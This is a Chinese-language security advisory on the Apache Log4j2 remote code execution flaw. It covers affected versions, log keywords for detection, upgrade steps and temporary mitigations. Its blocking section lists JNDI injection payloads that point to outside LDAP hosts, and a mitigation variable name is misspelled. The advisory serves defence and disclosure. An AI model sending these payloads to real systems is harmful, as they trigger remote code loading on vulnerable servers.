网络安全风险预警通告

Apache Log4j2 远程代码执行漏洞


漏洞名称

Apache Log4j 远程代码执行漏洞


威胁等级

非常严重

漏洞概述

Apache Log4j 是一款非常流行的开源的用于 Java 运行环境的日志记录工具包，大量的Java 框架都使用了该组件，故影响范围非常之大。

随着 Apache Log4j 的远程代码执行最新漏洞细节被公开，攻击者可通过构造恶意请求利用该漏洞实现在目标服务器上执行任意代码。可导致服务器被黑客控制，从而进行页面篡改、数据窃取、挖矿、勒索等行为。建议使用该组件的用户第一时间启动应急响应进行修复。

在使用 Log4j 打印输出的日志中，如果发现日志内容中包含关键词 ${，那么这个里面包含的内容会当做变量来进行替换和执行，导致攻击者可以通过恶意构造日志内容来让 Java 进程来执行任意命令，达到攻击的效果。攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。Apache Struts、Apache Solr、Apache Flink等均受影响。

影响范围

不受影响版本：Apache log4j-2.15.0-rc2

影响版本：Apache Log4j2 2.0 - 2.15.0-rc1

漏洞检测

1. 可以通过检查日志中是否存在 “jndi:ldap://”、“jndi:rmi” 等字符来发现可能的攻击行为。攻击者在利用前通常采用dnslog方式进行扫描、探测，对于常见利用方式可通过应用系统报错日志中的

"javax.naming.CommunicationException"、

"javax.naming.NamingException:problem generating object using object factory"

"Error looking up JNDI resource"关键字进行排查。

2、攻击者的数据包中可能存在:"${jndi:}" 字样。

3、推荐使用盛邦安全图形化Apache Log4j2检测工具进行漏洞检测；

免费自检工具下载链接：https://github.com/webraybtl/Log4j


修复建议

一、升级Apache Log4j 2至最新安全版本2.15.0-rc2：https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

二、升级已知受影响的应用及组件，如spring-boot-starter-log4j2/ApacheStruts2/ApacheSolr/ApacheDruid/Apache Flink。

三、建议全流量拦截一下相关语句。

${jndi:ldap://}

$(jndi:ldap://11.105rlfdnslogcn/test)

${jndi:ldap://1jrzb1.ceye.io/Exploit}

四、临时解决方案：

1.设置jvm参数"-Dlog4j2.formatMsgNoLookups=true"；

2.设置系统环境变量

"FORMAT_MESSAGES_PATTERN_DIS-ABLE_LOOKU_PS"为"true"

3、关闭应用的网络外连。
